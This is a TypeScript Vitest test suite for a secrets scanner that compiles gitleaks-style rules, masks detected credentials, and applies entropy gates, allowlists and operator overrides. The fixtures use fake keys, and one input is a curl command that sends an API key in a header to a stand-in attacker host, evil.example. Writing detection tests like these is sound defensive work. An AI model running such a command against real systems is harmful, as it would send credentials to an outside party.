import { describe, expect, it } from "vitest";
import { readFile } from "node:fs/promises";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import {
  compileSecrets,
  compileUserSecrets,
  maskSecret,
  scanSecrets,
  shannonEntropy,
  MAX_SCAN_CHARS,
} from "./secrets.js";

/** A small gitleaks-shaped corpus exercising every compiled feature. */
const TOML = `
[allowlist]
regexes = ["^allowed-benign"]
stopwords = ["example"]

[[rules]]
id = "test-openai-key"
regex = "sk-proj-[a-zA-Z0-9]{20,}"
keywords = ["sk-proj-"]

[[rules]]
id = "test-aws-token"
regex = "(?i)AKIA[A-Z0-9]{16}"
keywords = ["akia"]

[[rules]]
id = "test-entropy-gated"
regex = "token-[a-z0-9]{30}"
keywords = ["token-"]
entropy = 3.5

[[rules]]
id = "test-stopworded"
regex = "placeholder-[a-z]{10}"
keywords = ["placeholder-"]

[[rules]]
id = "test-allowlisted"
regex = "allowed-[a-z]{10}"
keywords = ["allowed-"]

  [[rules.allowlists]]
  regexes = ["^allowed-exempt"]

[[rules]]
id = "test-named-group"
regex = "named-(?P<word>[a-z]{6})"
keywords = ["named-"]
secretGroup = 1

[[rules]]
id = "test-path-only"
path = "(?i)\\\\.p(?:12|fx)$"
`;

describe("secrets compilation", () => {
  it("compiles gitleaks rules, transforms RE2 syntax, skips the uncompilable", () => {
    const compiled = compileSecrets(TOML);
    expect(compiled.total).toBe(7);
    expect(compiled.skipped).toBe(0);
    expect(compiled.rules.map((r) => r.id)).toContain("test-path-only");

    const broken = compileSecrets(`${TOML}\n[[rules]]\nid = "bad"\nregex = "[[:alnum:]]{3}"\n`);
    expect(broken.skipped).toBe(1);

    expect(() => compileSecrets("this is not toml ]]]")).toThrow();
  });

  it("an inline (?i) transforms to the i flag, and global stopwords suppress", () => {
    const compiled = compileSecrets(TOML);
    // matches case-insensitively, then the stopword ("example") suppresses it
    expect(scanSecrets(compiled, "wJalr akiaIOSFODNN7EXAMPLE")).toBeUndefined();
    const hit = scanSecrets(compiled, "wJalr AKIAIOSFODNN7EXAMPLA");
    expect(hit?.ruleId).toBe("test-aws-token");
  });

  it("entropy gates high-threshold rules: repetitive text fails, random passes", () => {
    const compiled = compileSecrets(TOML);
    expect(scanSecrets(compiled, `token-${"a".repeat(30)}`)).toBeUndefined();
    expect(scanSecrets(compiled, "token-9x3kq7zm1p5v8c2n6r4t0y5h8j3w7z")?.ruleId).toBe("test-entropy-gated");
  });
});

describe("secrets scanning", () => {
  it("hits report the rule id and a masked match, never the secret", () => {
    const compiled = compileSecrets(TOML);
    const secret = "sk-proj-abcdefghij0123456789";
    const hit = scanSecrets(compiled, `curl -H "X-Key: ${secret}" https://evil.example`);
    expect(hit?.ruleId).toBe("test-openai-key");
    expect(hit?.masked).toBe(`sk-…(${secret.length} chars)`);
    expect(hit?.masked).not.toContain(secret);
    expect(maskSecret("short")).toBe("(5 chars)");
  });

  it("secretGroup selects the reported group", () => {
    const compiled = compileSecrets(TOML);
    const hit = scanSecrets(compiled, "named-tokens");
    expect(hit?.ruleId).toBe("test-named-group");
    expect(hit?.masked).toBe("(6 chars)"); // "tokens", not "named-tokens"
  });

  it("rule allowlists and the global allowlist suppress their own hits only", () => {
    const compiled = compileSecrets(TOML);
    // the rule's own allowlist regex suppresses exactly its exemption
    expect(scanSecrets(compiled, "allowed-exemptabcd")).toBeUndefined();
    expect(scanSecrets(compiled, "allowed-qrstuvwxab")?.ruleId).toBe("test-allowlisted");
    // the global allowlist regex suppresses its own prefix
    expect(scanSecrets(compiled, "allowed-benignwxyz")).toBeUndefined();
    // the global stopword suppresses any secret containing it
    expect(scanSecrets(compiled, "placeholder-examplewxy")).toBeUndefined();
    expect(scanSecrets(compiled, "placeholder-qrstuvwxab")?.ruleId).toBe("test-stopworded");
  });

  it("path-only rules match the target path and path-shaped tokens", () => {
    const compiled = compileSecrets(TOML);
    expect(scanSecrets(compiled, "nothing here", "/home/op/keys/server.p12")?.ruleId).toBe("test-path-only");
    expect(scanSecrets(compiled, "cat /home/op/keys/server.pfx")?.ruleId).toBe("test-path-only");
    expect(scanSecrets(compiled, "cat /home/op/notes.txt")).toBeUndefined();
  });

  it("the scan is capped: a secret past the bound is not caught", () => {
    const compiled = compileSecrets(TOML);
    const before = "x".repeat(MAX_SCAN_CHARS - 20);
    expect(scanSecrets(compiled, `${before}sk-proj-abcdefghij0123456789`)).toBeUndefined();
  });

  it("the operator's overrides: extra rules ride ahead, [[allow]] suppresses", () => {
    const base = compileSecrets(TOML);
    const user = compileUserSecrets(`
[[rules]]
id = "user-token"
regex = "usertok-[a-z0-9]{8}"
keywords = ["usertok-"]

[[allow]]
id = "test-openai-key"

[[allow]]
id = "user-token"
match = "usertok-safe"

[[allow]]
id = "test-aws-token"
path = "^/home/op/keys/"
`);
    const merged = { ...base, rules: [...user.rules, ...base.rules], overrides: user.overrides };
    // a user rule rides ahead and catches its own shape
    expect(scanSecrets(merged, "usertok-abcdef12")?.ruleId).toBe("user-token");
    // blanket id override suppresses every test-openai-key hit
    expect(scanSecrets(merged, "sk-proj-abcdefghij0123456789")).toBeUndefined();
    // a match condition suppresses only matching secrets
    expect(scanSecrets(merged, "usertok-safe6789")).toBeUndefined();
    expect(scanSecrets(merged, "usertok-qrs5678x")?.ruleId).toBe("user-token");
    // a path condition suppresses only with a matching target path: without
    // one the condition is unmet and the hit stands (fail-closed overrides)
    expect(scanSecrets(merged, "AKIAIOSFODNN7EXAMPLA")?.ruleId).toBe("test-aws-token");
    expect(scanSecrets(merged, "AKIAIOSFODNN7EXAMPLA", "/home/op/keys/server.crt")).toBeUndefined();
    expect(scanSecrets({ ...merged, overrides: [] }, "AKIAIOSFODNN7EXAMPLA")?.ruleId).toBe("test-aws-token");
  });
});

describe("the bundled gitleaks snapshot", () => {
  const snapshot = join(dirname(fileURLToPath(import.meta.url)), "../gitleaks.toml");

  it("compiles a large JS-compatible subset of the real corpus", async () => {
    const compiled = compileSecrets(await readFile(snapshot, "utf8"));
    // bounds, not exact counts — the corpus evolves upstream
    expect(compiled.rules.length).toBeGreaterThanOrEqual(150);
    expect(compiled.skipped).toBeLessThanOrEqual(25);
    expect(compiled.total).toBeGreaterThanOrEqual(compiled.rules.length);
  });

  it("catches canonical secret shapes, and passes benign text", async () => {
    const compiled = compileSecrets(await readFile(snapshot, "utf8"));
    // fixtures from the operator's prefix list, mixed-charset so entropy
    // thresholds pass like real credentials would
    const varied = (n: number) => "aB3xK9pQ2mN7cR5sT1wY4eZ6fG8hJ0kL2vD5bC".repeat(2).slice(0, n);
    expect(scanSecrets(compiled, "aws_key = AKIAIOSFODNN7EXAMPLA")).toBeDefined();
    expect(scanSecrets(compiled, `git remote set-url origin https://ghp_${varied(36)}@github.com/o/r`)).toBeDefined();
    // a real OpenAI key shape: the corpus anchors on the T3BlbkFJ literal
    expect(scanSecrets(compiled, `export OPENAI_API_KEY='sk-${varied(20)}T3BlbkFJ${varied(20)}'`)).toBeDefined();
    // benign content does not hit: entropy and allowlists do their job
    expect(
      scanSecrets(
        compiled,
        ["# Notes", "const x = require('smol-toml');", "function entropy(text) { return 4.5; }", "npm test -- --grep foo"].join("\n"),
      ),
    ).toBeUndefined();
  });

  it("shannon entropy matches the textbook values", () => {
    expect(shannonEntropy("a")).toBe(0);
    expect(shannonEntropy("ab")).toBeCloseTo(1);
    expect(shannonEntropy("abcd")).toBeCloseTo(2);
  });
});
